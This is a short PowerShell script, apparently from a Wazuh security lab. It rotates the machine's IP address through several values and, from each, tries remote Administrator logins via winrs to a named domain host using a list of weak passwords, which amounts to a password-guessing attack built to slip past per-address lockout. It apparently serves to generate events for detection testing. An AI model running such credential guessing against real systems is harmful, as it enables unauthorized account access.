#get the interface parameters
$NIPConfig=Get-NetIPConfiguration|out-string
$NIPConfig=$NIPConfig -Split("`r`n")
$interfaceAlias=""
$prevIP=""
foreach ($line in $NIPConfig){
	if ($line.Contains("wazuh.local")){
		$interfaceAlias=$lastAlias.split(':')[1]
	}elseif ($line.Contains("InterfaceAlias")){
		$lastAlias=$line
	}elseif (-Not ([string]::IsNullOrEmpty($interfaceAlias)) -And $line.Contains("IPv4Address")){
		$prevIP=$line.split(':')[1]
		break
	}
}
if ([string]::IsNullOrEmpty($interfaceAlias) -Or [string]::IsNullOrEmpty($prevIP)){
	write-host "interfaceAlias is " $interfaceAlias + " prevIP and is " $prevIP
	exit 1
}else{
	#remove initial space
	$interfaceAlias=$interfaceAlias.substring(1)
	$prevIP=$prevIP.substring(1)
}

For ($i = 10; $i -le 13; $i+=1) {
	#new interface config
	$newIP='10.0.3.'
	$newIP+=$i
	New-NetIPAddress -InterfaceAlias $interfaceAlias -IPAddress $newIP -PrefixLength 24 |out-null
	Set-DnsClientServerAddress -InterfaceAlias $interfaceAlias -ServerAddresses 10.0.3.2

	#remove the previous ip
	Remove-NetIPAddress -InterfaceAlias $interfaceAlias -IPAddress $prevIP -Confirm:$false
	$prevIP=$newIP

	Start-Sleep -s 5
	write-host ""; Get-NetIPConfiguration -InterfaceAlias $interfaceAlias|out-string|findstr IPv4Address

	winrs -r:WIN-25U0PFAB511.wazuh.local -u:Administrator -p:'Password?' whoami
	winrs -r:WIN-25U0PFAB511.wazuh.local -u:Administrator -p:'Qwerty123' whoami
	winrs -r:WIN-25U0PFAB511.wazuh.local -u:Administrator -p:'123Qwerty' whoami
	winrs -r:WIN-25U0PFAB511.wazuh.local -u:Administrator -p:'Password123' whoami
	winrs -r:WIN-25U0PFAB511.wazuh.local -u:Administrator -p:'123Password' whoami
}
